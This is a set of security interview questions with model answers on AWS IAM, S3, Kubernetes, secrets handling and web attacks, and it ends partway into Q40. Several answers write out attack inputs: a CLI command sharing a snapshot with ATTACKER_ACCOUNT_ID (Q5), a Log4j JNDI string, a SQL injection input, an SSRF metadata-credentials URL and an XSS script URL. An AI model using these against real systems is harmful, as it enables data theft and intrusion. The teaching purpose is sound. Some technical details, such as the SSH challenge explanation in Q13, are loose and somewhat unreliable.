# 🔒 Security — Scenario-Based Interview Questions

**Q1. [L1] A developer accidentally pushed an AWS Access Key and Secret Key to a public GitHub repository. What steps do you take?**

> *What the interviewer is testing:* Incident response workflow for leaked credentials, containment vs. investigation.

**Answer:**
This is a critical security incident. The immediate priority is **Containment**:
1. Go directly to AWS IAM and **Deactivate** (do not immediately delete) the leaked access key. Deactivating stops any further use while preserving it for forensics.
2. Check AWS CloudTrail immediately for any actions performed by that specific access key since the time of the leak. Look for EC2 instance spawning (crypto-mining), IAM privilege escalation, or data exfiltration.
3. Review the code repository and rewrite the Git history to remove the credentials permanently, then force push the clean history.
4. If the key was used maliciously, initiate your organization's Incident Response Plan (e.g., isolating compromised instances, rotating related secrets).

---

**Q2. [L2] Your security scanner reports that a Docker image you deploy has 5 "Critical" vulnerabilities inside a system library. However, your application doesn't even use that library. How do you handle this?**

> *What the interviewer is testing:* Vulnerability management, distroless images, practical risk assessment.

**Answer:**
A critical CVE in an unused library still poses a risk if an attacker finds a way to execute it (e.g., via a remote code execution exploit in your main app that invokes the system shell), but it's a lower priority than an exploit in your direct code.

The SRE/DevSecOps approach is:
1. **Short term:** Suppress the finding mathematically showing it's unreachable, or update the base image if a patch is available.
2. **Long term (Better):** Rebuild the Docker image using a **Distroless** base image or `scratch`. Distroless images contain only your application and its direct runtime dependencies (no package managers, no shells, no unnecessary system libraries). This drastically reduces the attack surface and eliminates the vast majority of scanner noise.

---

**Q3. [L2] You need to give an EC2 instance access to read from an S3 bucket. A junior engineer suggests creating an IAM User, generating access keys, and hardcoding them into the app. Why is this bad, and what is the correct way?**

> *What the interviewer is testing:* IAM Roles, temporary credentials, avoiding static secrets.

**Answer:**
Hardcoding static AWS Access Keys is highly insecure because they can be easily leaked in source code, logs, or machine images, and they do not automatically rotate.
The correct way is to use an **IAM Role for EC2**:
1. Create an IAM Policy that grants exactly `s3:GetObject` on the specific bucket ARN.
2. Attach this policy to an IAM Role.
3. Attach the IAM Role to the EC2 instance via an Instance Profile.
4. The application uses the AWS SDK, which automatically queries the EC2 Metadata Service (`169.254.169.254`) to fetch temporary, automatically rotating, short-lived STS credentials to access S3 seamlessly. 

---

**Q4. [L3] Your company wants to ensure that a specific S3 bucket containing PII can *only* be accessed from a designated VPC, even by AWS administrators with Full S3 permissions. How do you enforce this?**

> *What the interviewer is testing:* S3 Bucket Policies, VPC Endpoints, defense in depth.

**Answer:**
IAM policies dictate *who* can access a resource, but an **S3 Bucket Policy** dictates the conditions under which the bucket itself accepts requests, overriding IAM permissions.

To enforce this, I would:
1. Create an S3 VPC Gateway Endpoint (or Interface Endpoint) in the designated VPC.
2. Apply a strict Bucket Policy to the S3 bucket that uses a `Deny` statement to block all `s3:*` actions if the `aws:sourceVpce` condition does NOT match the ID of the specific VPC Endpoint.
Because explicit Denys always override Allows in AWS IAM evaluation, even a user with `AdministratorAccess` will be blocked from accessing the bucket if they try to call the S3 API from the public internet or another VPC.

---

**Q5. [L2] An attacker gains SSH access to a web server running in AWS. The web server has an IAM Role attached that allows taking EC2 snapshots. The attacker uses this role to snapshot your production database server, but they can't download it from AWS because the snapshot is internal. How might they still steal your data?**

> *What the interviewer is testing:* Understanding of snapshot sharing, privilege escalation, lateral movement.

**Answer:**
Once an attacker can create an EBS snapshot, they have effectively bypassed all OS-level database security.
To steal the data, the attacker doesn't need to download the snapshot directly. Instead, they can:
1. Share the snapshot with their own external AWS Account ID using the AWS CLI: `aws ec2 modify-snapshot-attribute --snapshot-id snap-1234 --create-volume-permission "Add=[{UserId=ATTACKER_ACCOUNT_ID}]"`.
2. Once shared, they log into their own AWS account, create an EBS volume from the snapshot, attach it to their own EC2 instance, mount the filesystem, and freely copy all the unencrypted database files.
*Mitigation:* Use AWS KMS Customer Managed Keys (CMKs) to encrypt the root volumes; attackers cannot share snapshots encrypted with a KMS key they don't have policy access to.

---

**Q6. [L1] Explain the principle of Least Privilege.**

> *What the interviewer is testing:* Core security concepts.

**Answer:**
The Principle of Least Privilege states that a user, application, or system process should be given the bare minimum permissions necessary to perform its required function, and absolutely nothing more.
For example, if an application only needs to read objects from an S3 bucket, it should be granted `s3:GetObject` on that specific bucket ARN, rather than `s3:*` (full S3 access) or `*.*` (admin access). This minimizes the "blast radius" if the application or identity is ever compromised.

---

**Q7. [L2] Your team uses Kubernetes. Currently, all developers have `cluster-admin` access. You need to restrict them so they can only manage deployments in their specific namespace, without affecting others. How do you implement this?**

> *What the interviewer is testing:* Kubernetes RBAC (Role-Based Access Control).

**Answer:**
I would implement Kubernetes RBAC by combining generic Roles with specific RoleBindings.
1. Create a `Role` (namespaced) that defines the allowed actions, e.g., `create`, `get`, `update`, `delete` on resources like `pods`, `deployments`, and `services`.
2. Do not use a `ClusterRole` (unless you want to define a global template to be bound locally). A `ClusterRole` applies globally, whereas a `Role` is restricted to a single namespace.
3. Create a `RoleBinding` in the developer's specific namespace (e.g., `namespace-frontend`). This binds the `Role` permissions to the developer's user identity or Azure AD/OIDC group.
Now, the developer has full control inside `namespace-frontend`, but if they try to run `kubectl delete pod` in the `kube-system` namespace, the Kubernetes API server will reject it with a 403 Forbidden.

---

**Q8. [L3] During an audit, you discover that database passwords are being passed to Docker containers as plaintext Environment Variables via the orchestration tool. You are asked to implement a secure Secret Management system. Explain the architecture.**

> *What the interviewer is testing:* Vault/Secrets Manager architectures, sidecar pattern, memory-only secrets.

**Answer:**
Passing secrets as plain environment variables is a risk because they are visible in process trees (`/proc/pid/environ`), orchestration dashboards, and crash dumps.

A hardened architecture involves a centralized vault (like HashiCorp Vault or AWS Secrets Manager) and a **Sidecar/Init Container Pattern**:
1. The application's pod starts an Init Container.
2. The Init Container authenticates to the Vault using the Pod's Service Account identity (e.g., K8s JWT token via AWS IAM Roles for Service Accounts - IRSA).
3. It fetches the secret dynamically from the Vault.
4. It writes the secret to a shared memory-backed `tmpfs` volume (a RAM disk that never touches physical storage).
5. The main application container starts, reads the secret from the memory volume directly, and the `tmpfs` is wiped the moment the pod is destroyed.

---

**Q9. [L2] A compliance standard requires that all data at rest in your RDS databases be encrypted. How does AWS RDS encryption work, and what is transparent data encryption (TDE)?**

> *What the interviewer is testing:* Disk-level encryption vs. database-level encryption (KMS vs TDE).

**Answer:**
AWS RDS "Encryption at Rest" utilizes AWS KMS (Key Management Service). It operates at the underlying storage volume (EBS) level. When data is written to the disk, the hypervisor encrypts it; when read, it decrypts it. This protects against someone physically stealing the hard drive or gaining access to the raw EBS snapshots. However, any user with SQL access to the database queries the data in plaintext.

**TDE (Transparent Data Encryption)**, offered by engines like SQL Server and Oracle, encrypts the data at the database page/file level *before* it hits the disk.
For true end-to-end security involving PII, you must combine disk-level KMS with application-level or field-level encryption, where the application itself encrypts the SSN or credit card before inserting it, so even DB admins cannot run a `SELECT *` and see the plaintext.

---

**Q10. [L1] What is a WAF, and how does it differ from a standard Network Firewall?**

> *What the interviewer is testing:* OSI Layer 7 vs Layer 4 defense mechanisms.

**Answer:**
A standard Network Firewall (or AWS Security Group) operates at OSI Layers 3 & 4. It blocks IP addresses and network ports. It cannot see the *content* of the traffic. An attacker hitting an open port 443 with an SQL Injection attack walks right through a Network Firewall.

A **WAF (Web Application Firewall)** operates at OSI Layer 7. It inspects the actual HTTP requests and headers (GET payloads, POST bodies). IT mitigates OWASP Top 10 vulnerabilities by pattern-matching malicious signatures, such as SQL Injection (SQLi), Cross-Site Scripting (XSS), or aggressive botnet crawling, blocking them *before* they reach the application code.

---

**Q11. [L3] A critical vulnerability in a popular Java logging framework (like Log4j) is announced on a Friday night. It allows Remote Code Execution (RCE) via a simple HTTP header. You have 500 microservices. How do you respond systematically?**

> *What the interviewer is testing:* Zero-day incident response, mitigation hierarchy.

**Answer:**
I would execute a defense-in-depth response:
1. **Immediate Mitigation (Edge Filtering):** I cannot patch 500 services instantly. Immediately deploy a WAF rule (AWS WAF/Cloudflare) globally to block incoming HTTP requests containing the known malicious exploit strings (e.g., `${jndi:ldap...}`). This protects the perimeter instantly.
2. **Identification (Scanning):** Run an emergency vulnerability scan across all container registries and codebases using tools like Trivy or Snyk to identify exactly which of the 500 services actually use the vulnerable version of the library.
3. **Internal Mitigation (Egress Control):** The RCE requires the compromised server to make an outbound connection to the attacker's server to download the payload. Ensure strict Egress Network Policies / Security Groups are in place. If a backend service doesn't need the internet, block its outbound traffic.
4. **Remediation & Rollout (Patching):** Work with developer teams to upgrade the library in the identified services, build new images, and deploy them systematically over the weekend.

---

**Q12. [L2] What is cross-account IAM role assumption, and why is it considered safer than creating IAM users in every account?**

> *What the interviewer is testing:* STS AssumeRole, centralized identity management, reducing attack surface.

**Answer:**
If you have 10 AWS accounts (Dev, QA, Prod for various products), creating 10 individual IAM Users for an engineer means 10 sets of permanent access keys to manage, rotate, and potentially leak.

A safer architecture is a **Hub and Spoke** model using `sts:AssumeRole`.
1. The engineer has a single IAM User (or SSO identity) exclusively in a central "Identity Account".
2. In the "Prod Account", an IAM Role is created that trusts the Identity Account.
3. The engineer uses the AWS CLI/Console to run `AssumeRole`. AWS STS issues temporary, short-lived (e.g., 1 hour) credentials to act as that Role in the Prod Account.
This inherently forces credential expiration and allows security teams to manage all identities from a single pane of glass.

---

**Q13. [L1] How does asymmetric encryption (Public Key cryptography) work in the context of an SSH connection?**

> *What the interviewer is testing:* Public/Private key pairs, authentication basics.

**Answer:**
Asymmetric encryption uses two mathematically linked keys: a Public Key (which can be shared with anyone) and a Private Key (which must be kept completely secret by the user). Data encrypted by one can only be decrypted by the other.

When you SSH into a server:
1. You place your **Public Key** in your user's `~/.ssh/authorized_keys` file on the server.
2. When you attempt to connect, the server generates a random challenge message, encrypts it using your Public Key, and sends it back to your client.
3. Your SSH client automatically decrypts this challenge using your **Private Key**, and sends the decrypted result back to the server.
4. Because only your private key could have decrypted the challenge, the server mathematically verifies your identity and grants access.

---

**Q14. [L3] Your CI/CD pipeline builds a Docker image and pushes it to ECR. How do you ensure that only container images explicitly built and signed by your CI/CD pipeline can actually run in your Kubernetes production cluster?**

> *What the interviewer is testing:* Container signing, Admission Controllers, Supply Chain Security.

**Answer:**
To secure the software supply chain against image substitution or tampering, we must implement **Image Signing and Admission Control**.
1. **Signing:** During the CI/CD pipeline, after the image is built and vulnerability scanned successfully, we use a tool like **Cosign** or Docker Content Trust (Notary) to digitally sign the image hash using a private cryptographic key from our KMS. The signature is pushed to the registry alongside the image.
2. **Enforcement:** In the production Kubernetes cluster, we deploy an **Admission Controller** (like Kyverno or OPA Gatekeeper). When the API server receives a request to create a Pod, the admission controller intercepts it.
3. **Verification:** The admission controller pulls the signature from the registry and verifies it against our trusted Public Key before allowing the Pod to start. If developers try to `kubectl run` an unsigned image directly, K8s rejects it.

---

**Q15. [L2] Our company mandates MFA (Multi-Factor Authentication) for all AWS Console logins. However, developers are still using static AWS Access Keys in their local terminals which bypasses MFA. How do you enforce MFA for CLI access?**

> *What the interviewer is testing:* STS GetSessionToken, IAM condition keys for MFA.

**Answer:**
Static AWS CLI access keys are essentially single-factor authentication. To enforce MFA on the CLI:
1. Apply an **IAM Policy Condition** to the developers' IAM Group that explicitly denies all actions unless the `aws:MultiFactorAuthPresent` boolean is set to `true`.
2. The developers must now use the `aws sts get-session-token` command, passing in their MFA device serial number and the 6-digit code from their authenticator app.
3. STS returns a temporary Access Key, Secret Key, and Session Token. These temporary credentials carry the MFA claim, allowing the developer to bypass the IAM deny policy for the duration of the token (typically 8-12 hours). Tooling like AWS SSO v2 handles this seamlessly via browser popups.

---

**Q16. [L1] Explain the concept of a Bastion Host (Jump Box).**

> *What the interviewer is testing:* Network segmentation, secure remote access.

**Answer:**
A Bastion Host is a heavily fortified, purpose-built server exposed to the public internet (in a public subnet), designed specifically to act as a secure gateway to access servers in a private network.
Instead of exposing internal databases or application servers directly to the internet on port 22 (SSH), you place them in a private subnet with no public IPs.
Administrators first SSH into the Bastion Host. From the Bastion Host, they then SSH securely into the internal private servers. The Bastion Host acts as a single, easily monitorable, tightly controlled choke point for all administrative access. Modern clouds often replace traditional Bastions with managed services like AWS Systems Manager (SSM) Session Manager.

---

**Q17. [L3] An AWS S3 bucket holding company financial reports suffered a ransomware attack. An attacker gained access, enabled AWS KMS encryption using their own key (which they control), and locked out your access to read the files because you don't have access to their KMS key to decrypt it. How do you architect the bucket to prevent this entirely?**

> *What the interviewer is testing:* S3 Versioning, Object Lock, immutable backups, WORM.

**Answer:**
Standard S3 versioning is not enough here, as the attacker could maliciously encrypt the latest version *and* delete previous versions.

To mathematically prevent ransomware and ensure immutability, we must implement **S3 Object Lock in Compliance Mode**.
1. Enable S3 Versioning and Object Lock on bucket creation.
2. Configure a default retention period (e.g., 7 years) in **Compliance Mode**.
When a file is written under Compliance Mode, it becomes WORM (Write Once, Read Many). 
Absolutely *no one*, not even the AWS Account Root User, can delete or modify the object version until the retention period expires. If an attacker uploads an encrypted version over the file, the previous completely unencrypted version is perfectly preserved, locked, and fully recoverable because the attacker is physically blocked by the AWS control plane from deleting it.

---

**Q18. [L2] During a pentest, the testers found they could exploit a vulnerability in your Node.js app to read `/etc/passwd`. What OS-level container configuration should standardly prevent this kind of filesystem roaming?**

> *What the interviewer is testing:* Read-only root filesystems, container hardening.

**Answer:**
A fundamental tenant of container hardening is running the container with a **Read-Only Root Filesystem**.
In Kubernetes, this is achieved by setting `readOnlyRootFilesystem: true` in the pod's `securityContext`. In Docker, it's the `--read-only` flag.
When enabled, the application cannot overwrite binaries, modify `/etc/passwd`, or drop malicious payloads onto the disk during an exploit. Any directory the app legitimately needs to write to (like `/tmp` for caching) must be explicitly mounted as an ephemeral `emptyDir` or `tmpfs` volume, leaving the rest of the OS immutable and highly frustrating for attackers.

---

**Q19. [L2] Your security team mandates that AWS IAM passwords must be rotated every 90 days. Why is this considered an outdated practice for human users by NIST guidelines?**

> *What the interviewer is testing:* Modern password philosophy vs legacy compliance.

**Answer:**
Modern NIST (National Institute of Standards and Technology) guidelines advise *against* arbitrary periodic password rotation for human users.
Statistically, when forced to change passwords every 90 days, humans adopt poor, predictable behaviors to cope. They use patterns (e.g., `PasswordFall2023!`, `PasswordWinter2023!`), resulting in weaker overall security that attackers can easily guess.
The advised modern approach is:
1. Enforce strong, complex passwords or passphrases initially.
2. Enforce strict MFA (hardware tokens or authenticators).
3. Do not force rotation unless there is evidence of a breach or compromise.

---

**Q20. [L1] What is a Man-in-the-Middle (MITM) attack, and how does TLS prevent it?**

> *What the interviewer is testing:* HTTPS, Certificate Authorities, encryption in transit.

**Answer:**
A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and relays communications between two parties who believe they are communicating directly (e.g., over public Wi-Fi).

TLS prevents this through **Authentication via Certificates**. 
When a browser connects to a server via HTTPS, the server presents a digital Certificate cryptographically signed by a trusted third-party Certificate Authority (CA) that the browser's OS pre-trusts.
The browser mathematically verifies the signature to guarantee the server is legitimately the owner of the domain (Authentication), and then safely negotiates a shared symmetric encryption key. The attacker cannot impersonate the server because they do not have the private key corresponding to the CA-signed certificate, making interception impossible.

---

**Q21. [L1] Explain the difference between Phishing and Spear Phishing.**

> *What the interviewer is testing:* Social engineering attack vectors and targeted threat actors.

**Answer:**
**Phishing** is a broad, untargeted attack where malicious actors send mass emails (e.g., "Your PayPal account is locked") to millions of random people simultaneously. The goal is sheer volume, hoping a small fraction of recipients will mistakenly click the malicious link and enter their credentials.
**Spear Phishing** is a highly targeted attack directed at a specific individual or organization. Attackers conduct deep reconnaissance (LinkedIn, social media) to craft a highly convincing, personalized message (e.g., an email appearing to come from the CEO to the CFO requesting an urgent wire transfer to a specific vendor). It is much harder to detect and is often the entry point for major corporate breaches.

---

**Q22. [L2] An attacker discovers they can bypass your application's login form by entering `' OR 1=1 --` into the username field. What is this attack, and how do you prevent it natively in code?**

> *What the interviewer is testing:* SQL Injection (SQLi), Parameterized Queries, input sanitization vs raw concatenation.

**Answer:**
This is a classic **SQL Injection (SQLi)** attack. The application is likely taking user input and directly concatenating it into a raw string to build the SQL query (e.g., `SELECT * FROM users WHERE username = '` + input + `'`). The attacker's input alters the structural logic of the query so it always evaluates to true, logging them in as the first user in the table (usually the admin).
The fundamental prevention technique is **Parameterized Queries (Prepared Statements)**.
Instead of raw concatenation, the developer uses parameter placeholders (e.g., `WHERE username = ?`). The database driver securely sends the query structure and the user input separately. The database treats the input strictly as literal data, completely neutralizing any malicious SQL meta-characters.

---

**Q23. [L3] A cloud-native application hosted on AWS EC2 allows users to input a URL, and the server fetches the image at that URL to generate a thumbnail. An attacker inputs `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is this attack called, and how do you mitigate it at the infrastructure level?**

> *What the interviewer is testing:* Server-Side Request Forgery (SSRF), IMDSv1 vs IMDSv2, cloud metadata risks.

**Answer:**
This is a **Server-Side Request Forgery (SSRF)** attack. The attacker is tricking the server into making an HTTP request on their behalf to the internal AWS Instance Metadata Service (IMDS). Because the request originates from the EC2 instance itself, it succeeds, and the server dutifully returns the instance's highly privileged, temporary IAM credentials to the attacker.
**Infrastructure Mitigation:**
While input validation is necessary, the defense-in-depth infrastructure fix is to enforce **IMDSv2 (Instance Metadata Service Version 2)** on the EC2 instances. 
IMDSv2 requires a specific `PUT` request containing a secret token header before it responds to any `GET` requests. A basic SSRF vulnerability typically only allows an attacker to forge simple `GET` requests, rendering the attack against the metadata service useless.

---

**Q24. [L2] Define Cross-Site Scripting (XSS) and explain the difference between Stored and Reflected XSS.**

> *What the interviewer is testing:* Web client-side vulnerabilities, content security policy (CSP), output encoding.

**Answer:**
**Cross-Site Scripting (XSS)** is a vulnerability where an attacker injects malicious client-side JavaScript into a website. When a victim visits the site, their browser executes the attacker's script, typically stealing session cookies or performing actions on the victim's behalf.
- **Stored XSS (Persistent):** The attacker injects the malicious script directly into the application's database (e.g., by posting it in a blog comment section). Every user who views that comment section will automatically execute the payload. It is the most dangerous form.
- **Reflected XSS (Non-Persistent):** The malicious script is embedded entirely within a crafted URL parameter (e.g., `example.com/search?q=<script>alert('XSS')</script>`). The attacker must trick the victim into clicking this specific link. The server reflects the input back in the HTML response without storing it.

---

**Q25. [L1] An employee is repeatedly bombarded with MFA push notifications on their phone at 2 AM. Exhausted, they finally click "Approve" just to make it stop. What is this attack?**

> *What the interviewer is testing:* MFA Fatigue (Prompt Bombing), human-centric security flaws.

**Answer:**
This is called an **MFA Fatigue** attack (or MFA Prompt Bombing).
Attackers already possess the user's compromised password. They intentionally trigger the application to send dozens or hundreds of MFA push notifications to the user's mobile device, hoping the victim will eventually click "Approve" out of annoyance, fatigue, or by accident.
**Mitigation:** 
Implement "Number Matching" MFA, where the login screen displays a 2-digit number that the user must physically type into their authenticator app to approve the request, making accidental or fatigue-based approvals impossible.

---

**Q26. [L3] Your application uses stateless JSON Web Tokens (JWT) for authentication. During a security review, you notice the application accepts tokens with the header `{"alg": "none"}`. Why is this a catastrophic vulnerability?**

> *What the interviewer is testing:* JWT structural flaws, cryptographic bypasses, token validation libraries.

**Answer:**
A JWT consists of three parts: Header, Payload, and Signature. The Signature is what guarantees the token hasn't been tampered with.
The Header dictates what cryptographic algorithm was used to create the signature (e.g., `HS256` or `RS256`). 
If an application's JWT parsing library accepts the `alg: none` header, an attacker can simply decode a valid JWT, change the payload data (e.g., elevating their `role` from `user` to `admin`), strip the signature entirely, set the algorithm to `none`, and send it back. The server will parse the header, see "none", decide it doesn't need to mathematically verify a signature, and grant full admin access based on the forged payload.

---

**Q27. [L2] A developer accidentally mistypes a Python package installing command as `pip install request` instead of `requests`. The installation succeeds, but the application begins acting strangely. What attack vector just occurred?**

> *What the interviewer is testing:* Supply Chain Attacks, Typosquatting, package dependencies.

**Answer:**
This is a software supply chain attack known as **Typosquatting**.
Malicious actors purposefully publish packages to popular public repositories (PyPI, NPM, RubyGems) with names intentionally misspelled slightly differently than highly popular libraries (e.g., `request` vs `requests`, or `react-dom` vs `reactdom`).
If a developer makes a typo, they inadvertently download and execute the attacker's malicious code directly inside the corporate network. 
**Mitigation:** Enforce the use of a private, curated internal artifact repository (like Artifactory or Nexus) that caches approved public packages, preventing developers from pulling arbitrary unvetted code directly from the public internet.

---

**Q28. [L1] How does a Distributed Denial of Service (DDoS) attack work, and what is the primary role of a service like Cloudflare or AWS Shield in stopping it?**

> *What the interviewer is testing:* Volumetric attacks, Edge network absorption, Anycast routing.

**Answer:**
In a **DDoS attack**, an attacker commands a massive botnet of compromised devices to simultaneously send millions of junk requests (or pure network traffic) at a target server, completely overwhelming its CPU, memory, or network bandwidth, taking it offline for legitimate users.
Services like Cloudflare or AWS Shield mitigate this using **Anycast Edge Networks**. They sit in front of the application. Because their global networks possess far more bandwidth than any single botnet, they simply absorb the massive volume of traffic, intelligently filter out the junk packets at their edge nodes around the world, and only forward the legitimate, clean traffic back to the origin server.

---

**Q29. [L2] You notice thousands of failed login attempts per minute hitting your `/api/v1/login` endpoint from hundreds of different rotating IP addresses. How do you defend against this brute-force attack?**

> *What the interviewer is testing:* Distributed brute forcing, Rate Limiting, WAF managed rules, CAPTCHA.

**Answer:**
Because the attacker is rotating IPs (a distributed brute force or credential stuffing attack), simply blocking a single IP address will not work.
1. **Application Rate Limiting:** Implement strict rate limits based on the *username* being attempted, locking the account temporarily after 5 failed attempts (with careful consideration to avoid intentional denial-of-service against legitimate users).
2. **WAF Rules:** Deploy a Web Application Firewall with managed rules to detect and block traffic from known malicious botnets, VPNs, and Tor exit nodes.
3. **Friction/Challenges:** If behavior appears suspicious but isn't definitively malicious, inject a CAPTCHA challenge before processing the login request to mathematically prove the client is a human.

---

**Q30. [L3] You need to store highly sensitive customer data (like Social Security Numbers) in a database. Explain the "Envelope Encryption" architecture using AWS KMS.**

> *What the interviewer is testing:* Envelope encryption, Data Keys (DEK) vs Master Keys (CMK), performance optimization.

**Answer:**
Cryptographically encrypting gigabytes of data directly via an AWS KMS API call is incredibly slow, expensive, and subject to strict network payload limits (4KB max).
**Envelope Encryption** solves this by using two tiers of keys:
1. The application asks AWS KMS to generate a **Data Encryption Key (DEK)**. KMS returns two versions of this DEK: one in plainly usable text, and one encrypted by the highly secure KMS Master Key (Customer Managed Key).
2. The application uses the *plaintext* DEK to locally and rapidly encrypt the massive payload using a fast symmetric algorithm like AES-GCM.
3. The application then immediately deletes the plaintext DEK from RAM.
4. The application stores the newly encrypted payload *alongside* the KMS-encrypted version of the DEK in the database (the DEK acts as an "envelope" for the payload).
To decrypt, the application reads the encrypted envelope from the database, sends it to KMS to be decrypted, gets the plaintext DEK back, decrypts the payload locally, and discards the DEK again. 

---

**Q31. [L2] A legacy application requires a long-lived database password hardcoded in its configuration file. You cannot change the application code. How do you implement a secure secret rotation strategy?**

> *What the interviewer is testing:* Vault Agent, configuration templating, secret rotation without code changes.

**Answer:**
If the application absolutely cannot fetch secrets dynamically via an SDK, you use an external templating tool alongside a secrets manager, such as **Vault Agent Templates** or **AWS Secrets Manager with a sidecar**.
1. The secret (password) is stored centrally in the Vault.
2. An agent process runs alongside the legacy application container.
3. The agent watches the Vault. When the secret is rotated in the Vault, the agent pulls the new password, injects it into a raw configuration file template (e.g., `config.ini.tmpl`), and renders the new static `config.ini` to the disk.
4. The agent then sends a signal (e.g., `SIGHUP`) or restarts the legacy application process, forcing it to seamlessly reload the new configuration file containing the updated password from disk.

---

**Q32. [L1] What is a "Zero Trust Architecture"?**

> *What the interviewer is testing:* Modern network security paradigms, perimeter-less security.

**Answer:**
**Zero Trust** is a security model built on the principle of "Never trust, always verify."
Traditionally, corporate networks used a "Castle and Moat" design: anyone outside the VPN was a threat, but anyone inside the network (or on the VPN) was trusted by default.
Zero Trust assumes the network is *already* compromised. It dictates that no entity (user, device, or microservice)—whether deeply internal or remote—is trusted by default. Every single request, between any two services, must be explicitly authenticated, authorized, and continuously validated before access is granted.

---

**Q33. [L3] In Kubernetes, what is a "Container Escape" vulnerability, and why is running a container with `privileged: true` extremely dangerous?**

> *What the interviewer is testing:* Linux namespaces, cgroups, kernel capabilities, privileged containers.

**Answer:**
Containers are not true virtual machines; they are merely isolated processes sharing the same underlying Linux host kernel, governed by namespaces and cgroups. 
A **Container Escape** occurs when an attacker breaks out of this isolation and gains direct root access to the underlying host node (and thereby all other containers on that node).
Running a container with `privileged: true` is inherently dangerous because it disables almost all security namespace isolation. It grants the container full access to the host's devices (`/dev`) and allows it to execute unrestricted system calls to the kernel. If a process inside a privileged container runs as root, and an attacker compromises that process, they are effectively `root` on the host Kubernetes node itself.

---

**Q34. [L2] An IAM user has `ec2:RunInstances` permissions, but they do NOT have permissions to read S3 buckets. However, they also have the `iam:PassRole` permission for an existing `S3Admin` EC2 Role. Explain how this user can escalate their privileges to steal S3 data.**

> *What the interviewer is testing:* IAM PassRole abuse, privilege escalation vectors.

**Answer:**
This is a classic IAM privilege escalation path.
The user cannot read the S3 bucket directly. However, because they possess `iam:PassRole` along with `ec2:RunInstances`, they can:
1. Launch a new EC2 instance via the CLI.
2. During the launch, they "pass" the `S3Admin` role to the instance, effectively attaching it.
3. Once the instance boots, they SSH into it (or execute commands via User Data).
4. From inside the instance, they execute `aws s3 cp` commands. The command succeeds because the instance is using the temporary credentials of the highly privileged `S3Admin` role. The user bypasses their own restrictions and steals the data via the machine's identity.

---

**Q35. [L1] Contrast Symmetric and Asymmetric encryption, and explain when you would use each.**

> *What the interviewer is testing:* Cryptographic primitives, performance vs key exchange.

**Answer:**
- **Symmetric Encryption** (e.g., AES) uses the *exact same key* to both encrypt and decrypt data. It is extremely fast and computationally cheap, making it perfect for encrypting large volumes of data (like files on a hard drive or massive network payloads). However, securely sharing that single key across the internet is difficult.
- **Asymmetric Encryption** (e.g., RSA) uses a mathematically linked *pair of keys* (Public to encrypt, Private to decrypt). It solves the key-sharing problem because you can distribute the Public key freely. However, the complex math makes it extremely slow and CPU-intensive.
**Typical Use Case:** They are almost always used together. Asymmetric encryption is used briefly at the start of a connection to securely exchange a temporary Symmetric key, which is then used for the fast, bulk data transfer (this is exactly how HTTPS/TLS works).

---

**Q36. [L2] Your web application's frontend hosted on `app.example.com` makes an API call to `api.example.com`. The browser blocks the request with a "CORS Error". A developer fixes it by setting `Access-Control-Allow-Origin: *` on the API server. Why is this a major security risk if the API uses cookie-based authentication?**

> *What the interviewer is testing:* Cross-Origin Resource Sharing (CORS), CSRF, browser security models.

**Answer:**
**CORS (Cross-Origin Resource Sharing)** is a browser security mechanism that inherently blocks a malicious website (like `evil.com`) from pulling sensitive data from an API (like `yourbank.com`) using the victim's active session.
By setting `Access-Control-Allow-Origin: *` (wildcard), the developer tells the browser that *any* website in the world is allowed to read responses from the API. 
If the API relies on session cookies, an attacker can host a malicious page, trick the victim into visiting it, and the malicious page can silently query the API using the victim's authenticated browser session. The browser will permit the script to read the sensitive JSON data returned because the wildcard CORS header explicitly authorized it.

---

**Q37. [L3] You use GitHub Actions to deploy to AWS. Currently, you store long-lived AWS IAM Access Keys as GitHub Repository Secrets. Why is this an anti-pattern, and what is the modern, secure alternative?**

> *What the interviewer is testing:* OIDC (OpenID Connect), CI/CD federation, eliminating long-lived secrets.

**Answer:**
Storing long-lived static credentials in a third-party CI/CD platform is an anti-pattern because if the platform is compromised (or a developer accidentally dumps the environment variables in a CI log), the keys are permanently exposed until manually revoked.
The modern, secure alternative is **OIDC (OpenID Connect) Federation**.
Instead of storing static keys, you configure an OIDC Identity Provider in AWS that trusts GitHub's token authority.
In the GitHub Action, the pipeline requests a short-lived OIDC JSON Web Token from GitHub, cryptographically proving it represents a specific repository and branch. The pipeline sends this JWT to AWS STS via `AssumeRoleWithWebIdentity`. AWS validates the token signature and returns short-lived, temporary session credentials valid only for the duration of the deployment. Zero permanent secrets are stored anywhere.

---

**Q38. [L2] Your mobile application uses HTTPS to securely communicate with its backend. However, a security researcher installs a custom root CA on their phone, proxies the traffic through a tool like Burp Suite, and successfully intercepts the plaintext API calls. What security control is the mobile app missing?**

> *What the interviewer is testing:* Certificate Pinning, mobile app security, MITM proxies.

**Answer:**
By default, mobile OS environments and browsers unconditionally trust any certificate signed by a Root CA located in their system trust store. Because the researcher installed their own malicious Root CA into the phone's trust store, the app blindly accepts the proxy's forged certificates, allowing the MITM attack.
To prevent this, the mobile application must implement **Certificate Pinning (or Public Key Pinning)**.
The app's source code is hardcoded ("pinned") to only trust the specific cryptographic hash of the backend server's true certificate (or its true CA). When the proxy presents its forged certificate, even if it's considered "valid" by the phone's OS, the application logic will instantly reject the connection because the hash does not match the hardcoded pin.

---

**Q39. [L1] Explain the three core components of the CIA Triad in Information Security.**

> *What the interviewer is testing:* Fundamental security theory.

**Answer:**
The **CIA Triad** forms the foundation of all information security frameworks:
1. **Confidentiality:** Guaranteeing that sensitive data is accessed *only* by authorized individuals (e.g., using Encryption, Identity and Access Management).
2. **Integrity:** Guaranteeing that data has not been maliciously tampered with or corrupted in transit or at rest (e.g., using Hashing algorithms, Digital Signatures, Immutable backups).
3. **Availability:** Guaranteeing that authorized users have reliable and timely access to systems and data when needed (e.g., using Load Balancers, DDoS mitigation, Disaster Recovery failovers).

---

**Q40. [L3] A sophisticated attacker wants to intercept your company's web traffic. Even though your DNS is secure, they manage to physically hijack the routing paths of the internet so traffic destined for your datacenter IP addresses is sent to their servers in Russia. What is this attack called, and what defensive protocol mitigates it?**

> *What the interviewer is testing:* BGP Hijacking, Border Gateway Protocol, RPKI (Resource Public Key Infrastructure).

**Answer:**
This is a **BGP Hijacking** attack. The internet relies on the Border Gateway Protocol (BGP), where networks announce to each other which IP prefixes they own. By default, BGP operates on implicit trust. A malicious ISP can announce to the world that it is the fastest route to your IP space, and global routers will dynamically update and siphon your traffic into the attacker's black hole.
The primary defensive mitigation is **RPKI (Resource Public Key Infrastructure)**.
